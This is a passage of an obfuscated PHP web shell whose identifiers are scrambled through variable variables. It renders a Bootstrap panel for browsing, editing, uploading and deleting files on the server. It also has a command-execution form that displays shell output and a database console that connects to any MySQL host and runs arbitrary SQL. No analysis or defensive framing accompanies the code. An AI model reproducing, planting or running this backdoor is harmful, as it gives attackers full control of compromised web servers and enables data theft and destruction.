            echo "')\" class=\"btn btn-info\"><span class=\"glyphicon glyphicon-save\" aria-hidden=\"true\"></span>\n</button>\n\t\t\t\t\t\t\t\t\t  <button type=\"button\" title=\"File Modify\" onclick=\"fileModify('";
            echo ${${"GLOBALS"}["llgcfwuzv"]}[${$zpebxtt}];
            echo "')\"  class=\"btn btn-warning\"><span class=\"glyphicon glyphicon-wrench\" aria-hidden=\"true\"></span>\n</button>\n\t\t\t\t\t\t\t\t\t  <button type=\"button\" title=\"File Delete\" onclick=\"fileDelete('";
            echo ${${"GLOBALS"}["vjiwpnlmqsx"]}[${${"GLOBALS"}["ohxgkcq"]}];
            echo "')\" class=\"btn btn-danger\"><span  class=\"glyphicon glyphicon-trash\n\" aria-hidden=\"true\"></span>\n</button>\n\t\t\t\t\t\t\t\t\t</div>\n\n\t\t\t\t  \t\t\t\t</td>\n\n\t\t\t\t  \t\t\t</tr>\n\n\t\t\t\t  \t\t\t";
        }
        echo "\n\n\n\t\t\t\t  \t\t</tbody>\n\n\t\t\t\t\t  \t\n\t\t\t\t\t</table>\n\n\t\t\t\t\t</div>\n\n\t\t\t\t\t<hr>\n\n\n\t\t\t\t\t<form name=\"frm\">\n\t\t\t\t\t\t<div class=\"input-group\">\n\n\t\t\t\t\t\t  <input type=\"text\" class=\"form-control\" placeholder=\"File/Directory Name Input...\" name=\"createFileName\">\n\n\t\t\t\t\t      <span class=\"input-group-btn\">\n\t\t\t\t\t        <button class=\"btn btn-default\" type=\"button\" onclick=\"fileCreate()\">File Create</button>\n\t\t\t\t\t        <button class=\"btn btn-default\" type=\"button\" onclick=\"dirCreate()\">Directory Create</button>\n\t\t\t\t\t      </span>\n\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</form>\n\n\n\t\t\t\t";
    } else {
        if (${${"GLOBALS"}["cfpudeclhz"]} == "fileModify") {
            $hfuvenirxnvx = "page";
            $qkpflhvfy = "fileName";
            echo "\n\t\t\t\t\t";
            if (empty(${$qkpflhvfy})) {
                echo "<script>alert('Please insert file name.');history.back(-1);</script>";
                exit;
            }
            ${${"GLOBALS"}["apsnebbc"]} = ${${"GLOBALS"}["fbocqkztdlk"]} . ${${"GLOBALS"}["oykhaiz"]};
            $wuubhyprwp = "filePath";
            $cwhtmyjcjnas = "fp";
            $cykpffpkryak = "fp";
            $rdlykdmvwwe = "fileName";
            ${"GLOBALS"}["gbdlmb"] = "filePath";
            if (!file_exists(${${"GLOBALS"}["apsnebbc"]})) {
                echo "<script>alert('File is not exists.');history.back(-1);</script>";
                exit;
            }
            ${"GLOBALS"}["rcwuczcfiqp"] = "fileContents";
            ${$cwhtmyjcjnas} = fopen(${$wuubhyprwp}, "r");
            ${${"GLOBALS"}["rcwuczcfiqp"]} = @fread(${$cykpffpkryak}, filesize(${${"GLOBALS"}["gbdlmb"]}));
            $fqmbqcia = "fileContents";
            fclose(${${"GLOBALS"}["norrctyi"]});
            echo "\n\t\t\t\t\t<form action=\"";
            echo ${$hfuvenirxnvx};
            echo "?mode=fileModify&path=";
            echo ${${"GLOBALS"}["fbocqkztdlk"]};
            echo "&fileName=";
            echo ${${"GLOBALS"}["oykhaiz"]};
            echo "\" method=\"POST\">\n\t\t\t\t\t\t<div class=\"input-group\">\n\n\t\t\t\t\t\t  <input type=\"text\" class=\"form-control\" value=\"";
            echo ${${"GLOBALS"}["fbocqkztdlk"]};
            echo ${$rdlykdmvwwe};
            echo "\">\n\n\t\t\t\t\t      <span class=\"input-group-btn\">\n\t\t\t\t\t        <button class=\"btn btn-default\" type=\"submit\">File Modify</button>\n\t\t\t\t\t      </span>\n\n\t\t\t\t\t\t</div>\n\n\t\t\t\t\t<hr>\n\n\t\t\t\t\t<textarea class=\"form-control\" rows=\"20\" name=\"fileContents\">";
            echo htmlspecialchars(${$fqmbqcia});
            echo "</textarea>\n\t\t\t\t\t</form>\n\n\t\t\t\t\t<br>\n\n\t\t\t\t\t<p class=\"text-center\"><button class=\"btn btn-default\" type=\"button\" onclick=\"history.back(-1);\">Back</button></p>\n\n\t\t\t\t";
        } else {
            if (${${"GLOBALS"}["kisivpvxgj"]} == "fileUpload") {
                echo "\n\t\t\t\t<form action=\"";
                $bpqgskvg = "path";
                echo ${${"GLOBALS"}["lqnhrgxmgi"]};
                echo "?mode=fileUpload&path=";
                echo ${$bpqgskvg};
                echo "\" method=\"POST\" enctype=\"multipart/form-data\">\n\n\n\t\t\t\t\t<div class=\"input-group\">\n\n\t\t\t\t\t  <span class=\"input-group-addon\">Upload Path</span>\n\t\t\t\t\t  <input type=\"text\" class=\"form-control\" placeholder=\"Path Input...\" name=\"path\" value=\"";
                echo ${${"GLOBALS"}["fbocqkztdlk"]};
                echo "\">\n\n\t\t\t\t\t</div>\n\n\t\t\t\t\t<hr>\n\n\t\t\t\t\t  <div class=\"form-group\">\n\t\t\t\t\t    <label for=\"exampleInputFile\">file upload</label>\n\t\t\t\t\t    <input type=\"file\" id=\"exampleInputFile\" name=\"file\">\n\n\t\t\t\t\t    <br>\n\n\t\t\t\t\t    <p class=\"help-block\">↑ Select file</p>\n\n\t\t\t\t\t    <p class=\"text-center\"><button class=\"btn btn-default\" type=\"submit\">File Upload</button></p>\n\n\t\t\t\t\t  </div>\n\n\t\t\t\t</form>\n\n\t\t\t";
            } else {
                if (${${"GLOBALS"}["kisivpvxgj"]} == "command") {
                    $guuvgpzc = "page";
                    echo "\n\n\t\t\t\t<form action=\"";
                    echo ${$guuvgpzc};
                    $qirjings = "result";
                    echo "?mode=command\" method=\"POST\">\n\n\n\t\t\t\t\t<div class=\"input-group\">\n\n\t\t\t\t\t  <span class=\"input-group-addon\">Command</span>\n\t\t\t\t\t  <input type=\"text\" class=\"form-control\" placeholder=\"Command Input...\" name=\"command\" value=\"";
                    echo $_POST["command"];
                    $fyecpeoqv = "result";
                    echo "\">\n\n\t\t\t\t\t</div>\n\n\t\t\t\t\t<br>\n\n\t\t\t\t \t<p class=\"text-center\"><button class=\"btn btn-default\" type=\"submit\">Execution</button></p>\n\n\t\t\t\t\t\n\t\t\t\t</form>\n\n\t\t\t\t\t";
                    if (!empty($_POST["command"])) {
                        echo "<hr>";
                    }
                    ${${"GLOBALS"}["voojvsq"]} = str_replace("\n", "<br>", ${${"GLOBALS"}["voojvsq"]});
                    ${$qirjings} = iconv("CP949", "UTF-8", ${${"GLOBALS"}["voojvsq"]});
                    echo ${$fyecpeoqv};
                    echo "\n\n\t\t\t\t";
                } else {
                    if (${$dsrgwsqsft} == "db") {
                        ${"GLOBALS"}["shldfgwf"] = "dbHost";
                        ${"GLOBALS"}["elekrwjdsuh"] = "dbPw";
                        echo "\n\t\t\t\t";
                        if (empty(${${"GLOBALS"}["shldfgwf"]}) || empty(${${"GLOBALS"}["sygmlddf"]}) || empty(${${"GLOBALS"}["elekrwjdsuh"]}) || empty(${${"GLOBALS"}["jrklfdwree"]})) {
                            $kpboxal = "page";
                            echo "\n\t\t\t\t<form action=\"";
                            echo ${$kpboxal};
                            echo "?mode=db\" method=\"POST\">\n\n\n\t\t\t\t\t<div class=\"input-group\">\n\n\t\t\t\t\t  <span class=\"input-group-addon\">HOST</span>\n\t\t\t\t\t  <input type=\"text\" class=\"form-control\" placeholder=\"Host Input...\" name=\"dbHost\">\n\n\t\t\t\t\t  <span class=\"input-group-addon\">ID</span>\n\t\t\t\t\t  <input type=\"text\" class=\"form-control\" placeholder=\"ID Input...\" name=\"dbId\">\n\n\t\t\t\t\t  <span class=\"input-group-addon\">PW</span>\n\t\t\t\t\t  <input type=\"password\" class=\"form-control\" placeholder=\"PW Input...\" name=\"dbPw\">\n\n\t\t\t\t\t  <span class=\"input-group-addon\">DB</span>\n\t\t\t\t\t  <input type=\"text\" class=\"form-control\" placeholder=\"DB Input...\" name=\"dbName\">\n\n\t\t\t\t\t</div>\n\n\t\t\t\t\t<br>\n\n\t\t\t\t \t<p class=\"text-center\"><button class=\"btn btn-default\" type=\"submit\">Connection</button></p>\n\n\t\t\t\t\t\n\t\t\t\t</form>\n\n\t\t\t\t";
                        } else {
                            $qcpiemprr = "dbName";
                            $llwmpq = "dbConn";
                            ${"GLOBALS"}["irohhd"] = "dbId";
                            $wkanyvh = "dbHost";
                            ${"GLOBALS"}["xdxfkglkoo"] = "page";
                            $icfxwqaiz = "dbPw";
                            $rtnkomxfzmae = "dbPw";
                            ${${"GLOBALS"}["tsergpidqx"]} = new mysqli(${$wkanyvh}, ${${"GLOBALS"}["irohhd"]}, ${$rtnkomxfzmae}, ${$qcpiemprr});
                            if ($dbConn->connect_error) {
                                echo "<script>alert('Failed DB connection');history.back(-1);</script>";
                                exit;
                            }
                            mysqli_query(${$llwmpq}, "set names utf8");
                            echo "\n\n\t\t\t\t<form action=\"";
                            echo ${${"GLOBALS"}["xdxfkglkoo"]};
                            echo "?mode=db\" method=\"POST\">\n\n\n\t\t\t\t\t<div class=\"input-group\">\n\n\t\t\t\t\t  <span class=\"input-group-addon\">SQL</span>\n\t\t\t\t\t  <input type=\"text\" class=\"form-control\" placeholder=\"Query Input...\" name=\"query\" value=\"";
                            echo ${${"GLOBALS"}["cryqwdnlto"]};
                            echo "\">\n\n\n\t\t\t\t\t</div>\n\n\t\t\t\t\t<br>\n\n\t\t\t\t \t<p class=\"text-center\"><button class=\"btn btn-default\" type=\"submit\">Execution</button></p>\n\n\t\t\t\t \t<input type=\"hidden\" name=\"dbHost\" value=\"";
                            echo ${${"GLOBALS"}["hukwjvtvq"]};
                            echo "\">\n\t\t\t\t \t<input type=\"hidden\" name=\"dbId\" value=\"";
                            echo ${${"GLOBALS"}["sygmlddf"]};
                            echo "\">\n\t\t\t\t \t<input type=\"hidden\" name=\"dbPw\" value=\"";
                            echo ${$icfxwqaiz};
                            echo "\">\n\t\t\t\t \t<input type=\"hidden\" name=\"dbName\" value=\"";
                            echo ${${"GLOBALS"}["jrklfdwree"]};
                            $fxxwxqxwxkd = "query";
                            echo "\">\n\t\t\t\t\t\n\t\t\t\t</form>\n\n\t\t\t\t";
                            if (!empty(${$fxxwxqxwxkd})) {
                                ${"GLOBALS"}["gccmprnaqp"] = "rowCnt";
                                ${"GLOBALS"}["pmokocicoxka"] = "query";
                                ${${"GLOBALS"}["voojvsq"]} = $dbConn->query(${${"GLOBALS"}["pmokocicoxka"]});
                                ${"GLOBALS"}["cffrpbhjsm"] = "rowCnt";
                                ${${"GLOBALS"}["gccmprnaqp"]} = $result->num_rows;
                                echo "\n\t\t\t\t<table class=\"table table-bordered table-hover\">\n\n\t\t\t\t";
                                for (${${"GLOBALS"}["ohxgkcq"]} = 0; ${${"GLOBALS"}["ohxgkcq"]} < ${${"GLOBALS"}["cffrpbhjsm"]}; ${${"GLOBALS"}["ohxgkcq"]}++) {
                                    $tdbtwjbcg = "row";
                                    ${"GLOBALS"}["oqcgemtv"] = "key";
                                    ${"GLOBALS"}["pmjivw"] = "i";
                                    ${$tdbtwjbcg} = $result->fetch_assoc();
                                    if (${${"GLOBALS"}["pmjivw"]} == 0) {
                                        $wlsqdqbq = "key";
                                        $braowrremycv = "value";
                                        $cdnubtmllcc = "row";
                                        $wsqqhmxbggdc = "ratio";
                                        ${$wsqqhmxbggdc} = 100 / count(${$cdnubtmllcc});
                                        ${"GLOBALS"}["emjxonq"] = "row";
                                        echo "\t\t\t\t\t\t\t\t<thead>\n\n\t\t\t\t\t\t\t\t\t<tr class=\"active\">\n\t\t\t\t\t\t\t\t\t";
                                        foreach (${${"GLOBALS"}["emjxonq"]} as ${$wlsqdqbq} => ${$braowrremycv}) {
                                            ${"GLOBALS"}["fwshtcn"] = "ratio";
                                            $qkgfslseyat = "key";
                                            echo "\t\t\t\t\t\t\t\t\t\t<th style=\"vertical-align:middle; ";
                                            echo ${${"GLOBALS"}["fwshtcn"]};
                                            echo "\$\" class=\"text-center\">";
                                            echo ${$qkgfslseyat};
                                            echo "</th>\n\t\t\t\t\t\t\t\t\t\t";
                                        }
                                        echo "\t\t\t\t\t\t\t\t\t</tr>\n\n\t\t\t\t\t\t\t\t</thead>\n\t\t\t\t\t\t\t\t<tobdy>\n\t\t\t\t\t\t\t\t";
                                    }
                                    echo "<tr>";
                                    foreach (${${"GLOBALS"}["inixxyyl"]} as ${${"GLOBALS"}["oqcgemtv"]} => ${${"GLOBALS"}["dfmgnyreii"]}) {
                                        echo "\t\t\t\t\t\t\t\t<td style=\"vertical-align: middle\" class=\"text-center\">";
                                        echo ${${"GLOBALS"}["dfmgnyreii"]};
                                        echo "</td>\n\t\t\t\t\t\t\t";
                                    }
                                    echo "</tr>";
                                }
                                echo "\n\t\t\t\t</tobdy>\n\t\t\t\t</table>\n\n\t\t\t\t";
                            }
                            echo "\n\t\t\t\t";
                        }
                        echo "\t\t\t\t";
                    }
                }
            }
        }
    }
    echo "\t\t\t\t";
}
echo "\n\t\t\t\t\t<hr>\n\n\t\t\t\t\t<p class=\"text-muted text-center\">Copyrightⓒ 2021, Unknown, All rights reserved.</p>\n\n\n\n\n\t\t\t\t  </div>\n\n\t\t\t\t  <div class=\"col-md-3\"></div>\n\t\t\t\t</div>\n\t\t\t</div>\n\n\t</body>\n\n</html>\n\n\n";